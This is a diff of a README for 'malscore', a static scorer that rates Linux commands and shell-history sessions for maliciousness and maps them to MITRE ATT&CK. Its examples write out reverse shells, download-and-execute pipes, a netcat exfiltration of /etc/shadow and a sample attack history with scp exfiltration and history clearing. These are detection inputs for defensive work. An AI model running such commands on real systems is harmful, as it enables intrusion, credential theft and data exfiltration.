@@ -1,10 +1,11 @@
-# malscore — maliciousness scoring for Linux commands and scripts
+# malscore — maliciousness scoring for Linux commands
 
-`malscore` takes a Linux command line or a whole shell script and returns a
-**0–100 maliciousness score** with a verdict band and MITRE ATT&CK mapping:
+`malscore` takes a Linux command line, or a session of commands such as a shell
+history, and returns a **0–100 maliciousness score** with a verdict band and
+MITRE ATT&CK mapping:
 
 ```
-raw command/script → features → signals → score + MITRE mapping
+command(s) → features → signals → score + MITRE mapping
 ```
 
 It never executes, expands or resolves anything — it only reads the text
@@ -27,11 +28,12 @@ python3 malscore.py "<command>"
 # one command
 malscore "curl -s http://45.33.2.1/x.sh | bash"
 
-# a whole script (per-statement + cross-statement analysis)
-malscore -f deploy.sh
-
-# from stdin
+# the command from stdin
 echo "nc -e /bin/sh 10.0.0.1 4444" | malscore -
+
+# a session: one command per line, scored individually and across commands
+malscore --session history.txt
+history | cut -c8- | malscore --session -
 
 # every command in a telemetry feed, high or worse only
 malscore --batch events.jsonl --min-verdict high
@@ -40,13 +42,13 @@ malscore --batch events.jsonl --min-verdict high
 malscore "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1" --explain
 
 # machine-readable
-malscore -f suspicious.sh --json
+malscore --session history.txt --json
 
-# CI / gate use: non-zero exit when the verdict is high or critical
-malscore -f release.sh --fail-on high
+# gate use: exit code 2 when the verdict is high or critical
+malscore --session history.txt --fail-on high
 ```
 
-Example:
+Examples:
 
 ```
 $ malscore "sudo cat /etc/shadow | nc 45.33.2.1 9001" --explain
@@ -61,7 +63,35 @@ $ malscore "sudo cat /etc/shadow | nc 45.33.2.1 9001" --explain
     [0.35] exfiltration           Data is sent over a raw socket
            T1048
     ...
+
+$ cat history.txt
+cd /tmp
+curl -s -o /tmp/.x http://45.33.2.1/x
+chmod +x /tmp/.x
+/tmp/.x
+tar czf /tmp/etc.tgz /etc
+scp /tmp/etc.tgz loot@45.33.2.1:/srv/
+history -c
+
+$ malscore --session history.txt
+████████████████████████  score  99/100  CRITICAL
+  history.txt
+  tactics: execution, defense-evasion, exfiltration, command-and-control, collection
+
+  7 command(s), 6 flagged:
+    ████████████░░░░░░░░░░░░ L2     49 medium   curl -s -o /tmp/.x http://45.33.2.1/x
+    ███████░░░░░░░░░░░░░░░░░ L3     30 low      chmod +x /tmp/.x
+    ███████░░░░░░░░░░░░░░░░░ L4     30 low      /tmp/.x
+    ██████░░░░░░░░░░░░░░░░░░ L5     25 low      tar czf /tmp/etc.tgz /etc
+    ████████░░░░░░░░░░░░░░░░ L6     35 medium   scp /tmp/etc.tgz loot@45.33.2.1:/srv/
+    ████████████░░░░░░░░░░░░ L7     50 medium   history -c
+  signals: staged_download_execution, history_cleared, collect_then_exfiltrate, upload_public_ip, multi_stage, hidden_temp_path ...
 ```
+
+In a session file every non-blank line is one command, taken literally: there is
+no handling of comments, line continuations or here-documents. `--batch` is
+different: it scores each command of a JSON feed independently, with no
+cross-command analysis.
 
 ---
 
@@ -98,12 +128,13 @@ every point of the score traces to a named signal and a MITRE ATT&CK technique.
    signals accumulate but never overflow and one strong signal dominates.
    Redundant signals that share a tactic are damped, so tripping three
    persistence checks is not counted as three independent findings.
-4. **Scripts.** A script is split into statements (comments, continuations,
-   quotes and here‑documents handled without executing anything); each statement
-   is scored, and then **cross‑statement** signals look for patterns no single
-   line shows — a file downloaded early and run later, a `tar` whose archive is
-   `scp`‑ed away, credential access followed by an upload, activity followed by
-   history/log clearing, or a chain spanning three or more tactics.
+4. **Sessions.** Each command in a session is scored as above (its
+   contribution capped at 0.9, so one noisy command does not make a long session
+   critical), and then **cross‑command** signals look for patterns no single
+   command shows — a file downloaded early and run later, a `tar` whose archive
+   is `scp`‑ed away, credential access followed by an upload, download plus
+   persistence, activity followed by history/log clearing, or activity spanning
+   three or more tactics.
 
 ### Why a static score is not the whole story
 
@@ -112,8 +143,8 @@ A static score measures *what a command intrinsically does*. It cannot know that
 that is a **behavioural** judgement relative to a user/host baseline, which is
 what a downstream anomaly model (e.g. an Isolation Forest over per-user
 history) is for. Activity the static scorer rates low (e.g. data staging spread
-across a session) is exactly what an anomaly layer exists to catch — and script
-mode recovers much of it once the whole session is scored together.
+across a session) is exactly what an anomaly layer exists to catch — and
+session scoring recovers much of it once the commands are scored together.
 
 The intended production shape is a hybrid:
 
@@ -137,11 +168,10 @@ The intended production shape is a hybrid:
 | --- | --- |
 | `malscore.py` | standalone entry point (`python3 malscore.py …`) |
 | `malscore/lexer.py` | non-executing shell lexer |
-| `malscore/script.py` | splits scripts into statements and here-docs |
 | `malscore/context.py` | resolves executables, payloads, paths, URLs, IPs, ports |
 | `malscore/features.py` | computes the feature record for one command line |
 | `malscore/signals.py` | weighted, MITRE-mapped signal catalogue |
-| `malscore/scoring.py` | noisy-OR scoring, script and cross-statement analysis |
+| `malscore/scoring.py` | noisy-OR scoring and cross-command session analysis |
 | `malscore/cli.py` | command-line interface |
 
 ---
@@ -152,18 +182,19 @@ The intended production shape is a hybrid:
 from malscore import Analyzer
 
 a = Analyzer()
-r = a.assess("curl -s http://1.2.3.4/x.sh | bash")
+r = a.assess_command("curl -s http://1.2.3.4/x.sh | bash")
 print(r.score, r.verdict)                 # 67 high
 print([h.id for h in r.hits])             # ['download_pipe_interpreter', 'raw_ip_url', ...]
 print(r.techniques)                       # ['T1059.004', 'T1105', 'T1071.001']
 
-r = a.assess(open("deploy.sh").read())    # script: r.per_statement holds each line
+r = a.assess_session(["curl -o /tmp/p http://1.2.3.4/p", "/tmp/p"])
+print(r.score, [h.id for h in r.hits])    # 75 ['staged_download_execution', ...]
+print([c.score for c in r.per_command])   # each command's own assessment
 print(r.as_dict())                        # JSON-ready
 ```
 
-`Analyzer.assess` picks command vs script by shape; `assess_command` and
-`assess_script` force one. `Analyzer(redact=True)` redacts credential-looking
-values before any command text is echoed back.
+`Analyzer(redact=True)` redacts credential-looking values before any command
+text is echoed back; scores are unaffected.
 
 ---
 
